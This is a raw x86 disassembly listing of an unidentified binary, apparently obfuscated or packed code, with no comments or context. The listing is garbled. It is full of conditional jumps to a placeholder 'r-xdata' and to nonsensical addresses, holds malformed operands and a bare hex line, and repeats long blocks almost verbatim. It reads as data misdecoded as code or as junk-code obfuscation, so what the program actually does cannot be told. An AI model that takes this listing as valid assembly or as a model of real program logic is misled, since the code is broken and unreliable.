sub esp 0xc
call sub_402ca7
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4029cd
pop ecx
pop edx
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jae r-xdata
add edx 0xff108f0f
pop edx
mov eax 0xff55870f
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1e7e1
ja r-xdata
call 0xffca2f0
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a466b7
jg r-xdata
and ebx 0xff5a870f
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop edx
pop edx
jae r-xdata
jne r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
ja r-xdata
jg r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
jae r-xdata
ja r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
pushfd
push esi
call sub_402a51
sub ebx 0xa48f0f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
ja r-xdata
jge 0x71fc6959
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1a91b
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b152
add [ eax ] al
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jno r-xdata
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_402b6b
add esi 0xa6830f
add [ eax ] al
mov ebx 0xf04c483
jae r-xdata
ja 0xffffffffa3c33a16
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
pop eax
ja r-xdata
xor edx 0x880f5e7f
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
push ecx
push edx
push ebp
sub esp 0x4
call sub_402a1d
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jne r-xdata
sub edi 0x64244481
div [ eax ]
inc eax
add [ ebx + 0x5a5928ec ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacba7e
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
push ebp
pushfd
call sub_402a5a
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jne r-xdata
or edx 0xf3812e79
jg r-xdata
jpo 0xdeaffc
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
pop eax
jge r-xdata
jge 0xffffffffffa2ad06
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16840
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402deb
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jg r-xdata
ja 0xffffffffff9bacd3
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48ef36
lea eax [ ecx + 0x1 ]
add [ eax ] al
pop ecx
jns r-xdata
jno 0xffffffff874f5fb9
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93474
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_402a7d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jno r-xdata
and ebx 0x870f4975
jae r-xdata
call sub_402be2
jb 0xffffffff81b2a898
or edx 0x54549c55
ja r-xdata
xor ebx 0xff3d870f
call sub_4029cd
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f030
jg r-xdata
ja 0xcaae2c
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44f25f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
jmp 0xffffffffff79ab14
pop edx
jge r-xdata
jo 0xffffffff854f8525
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44efeb
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcfd2a
add esp 0x4
jae r-xdata
jl 0xf3adae
jg r-xdata
add eax 0x5abb2979
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa046
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0b069
pop eax
jg r-xdata
jge 0xffffffff894f84a7
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd3c6d
ja r-xdata
jno 0xffffffffe8917f44
push 0x81ffffff
out 0x77 al
jne r-xdata
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402a88
jae 0xffffffffff43b2ad
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jno r-xdata
jae 0xffffffff8428a523
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158b008
push edi
call sub_402cda
jg 0xfffffffff0b38701
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bb84
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jae r-xdata
je 0xffffffffff6db0f5
jge r-xdata
les ecx [ eax ]
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586621fd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a86d7
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f8711
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c9b2
jo 0xffffffffa2c13bc5
push ecx
push edx
call sub_402caa
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16007
push edx
call sub_402c46
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402cc1
jo 0xff9a2ae
jo 0xffffffff894f86eb
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402c84
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402d2a
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b235
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ca7
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402a1d
ja r-xdata
jno r-xdata
jl 0x2f28c67e
jno r-xdata
jl 0xfffffffff6c1e7e1
add [ eax ] al
add [ edx + 0x7504c483 ] bh
pop edx
pop edx
jns 0xffffffff8150068c
ja r-xdata
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jne r-xdata
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b152
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jg r-xdata
xor ecx 0xff70810f
jae r-xdata
ja 0xffffffff89a466b7
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffca2f0
cmp [ edi + 0x7f ] 0x81

ja r-xdata
or ebx 0xff6e8f0f
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
ja r-xdata
xor ebx 0xff3d870f
ja r-xdata
jg r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
jne r-xdata
sub edi 0x64244481
div [ eax ]
inc eax
add [ ebx + 0x5a5928ec ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacba7e
jae r-xdata
ja 0xffffffffa3c33a16
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
jmp 0xffffffffff79ab14
ja r-xdata
jge 0x71fc6959
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1a91b
jg r-xdata
jpo 0xdeaffc
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
add eax 0x5abb2979
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402deb
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16840
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93474
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_402a7d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
pushfd
push esi
call sub_402a51
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_402b6b
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jae r-xdata
call [ 0xffffffffc181727f ]
push ecx
push edx
push ebp
sub esp 0x4
call sub_402a1d
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f030
jg r-xdata
ja 0xcaae2c
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44f25f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48ef36
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bacd3
jae r-xdata
add edx 0xff108f0f
call sub_4029cd
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
rol [ ecx + 0x108f0fc2 ] 0xff
push ebp
pushfd
call sub_402a5a
mov edx 0x7504c483
mov esp 0xe2818371
jne r-xdata
or edx 0xf3812e79
pop edx
jge r-xdata
jo 0xffffffff854f8525
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44efeb
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcfd2a
jae r-xdata
call sub_402be2
jb 0xffffffff81b2a898
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
pop edx
mov eax 0xff55870f
pop eax
jge r-xdata
jge 0xffffffffffa2ad06
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa046
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0b069
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
pop ecx
jns r-xdata
jno 0xffffffff874f5fb9
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd3c6d
add esp 0x4
jae r-xdata
jl 0xf3adae
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402a88
jae 0xffffffffff43b2ad
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f84a7
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe8917f44
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158b008
push edi
call sub_402cda
jg 0xfffffffff0b38701
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bb84
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586621fd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a86d7
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428a523
jae r-xdata
call 0xffffffff854f8711
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c9b2
jo 0xffffffffa2c13bc5
push ecx
push edx
call sub_402caa
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16007
push edx
call sub_402c46
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402cc1
jo 0xff9a2ae
jo 0xffffffff894f86eb
jae r-xdata
je 0xffffffffff6db0f5
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402c84
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402d2a
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b235
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ca7
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402a51
pop ecx
ja r-xdata
pop edx
ja r-xdata
jae 0xffffffff81ce9fb6
pop eax
jns r-xdata
jno 0xffffffffefc16840
out dx eax
jae r-xdata
jne 0xffffffffe3c20c4f
push ecx
push edx
push ebp
sub esp 0x4
call sub_402a1d
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jg r-xdata
sub edi 0x5c755a59
ja r-xdata
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jno r-xdata
jno 0xfffffffff1c1b386
ja r-xdata
jge 0x71fc6959
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
ja r-xdata
and edx 0xff42850f
jno r-xdata
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jae r-xdata
xor ebx 0xff728f0f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b152
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1e7e1
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
ja r-xdata
jmp [ 0xfffffffff381df77 ]
jno r-xdata
sub esi 0x89641f79
push ebp
pushfd
call sub_402a5a
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
and ebx 0xff5a870f
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffca2f0
cmp [ edi + 0x7f ] 0x81

jae r-xdata
ja 0xffffffff89a466b7
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
pop eax
jge r-xdata
jge 0xffffffffffa2ad06
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jg r-xdata
pop edx
pop edx
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1a91b
pop ecx
jns r-xdata
jno 0xffffffff874f5fb9
pushfd
push esi
call sub_402a51
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_402b6b
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jne r-xdata
sub edi 0x64244481
div [ eax ]
inc eax
add [ ebx + 0x5a5928ec ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacba7e
jae r-xdata
ja 0xffffffffa3c33a16
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
add edx 0xff108f0f
jg r-xdata
jpo 0xdeaffc
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
ja r-xdata
pop edx
mov eax 0xff55870f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402deb
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jge r-xdata
mov [ fs : edi - 0x21 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93474
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_402a7d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jne r-xdata
or edx 0xf3812e79
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f030
jg r-xdata
ja 0xcaae2c
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44f25f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48ef36
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bacd3
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
pop edx
jge r-xdata
jo 0xffffffff854f8525
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44efeb
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcfd2a
jae r-xdata
call sub_402be2
jb 0xffffffff81b2a898
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa046
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0b069
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
ja r-xdata
xor ebx 0xff3d870f
call sub_4029cd
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd3c6d
add esp 0x4
jae r-xdata
jl 0xf3adae
jae r-xdata
jmp 0xffffffffff79ab14
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402a88
jae 0xffffffffff43b2ad
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f84a7
jg r-xdata
add eax 0x5abb2979
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe8917f44
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158b008
push edi
call sub_402cda
jg 0xfffffffff0b38701
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bb84
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586621fd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a86d7
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428a523
jae r-xdata
call 0xffffffff854f8711
xor al 0xff
pop ecx
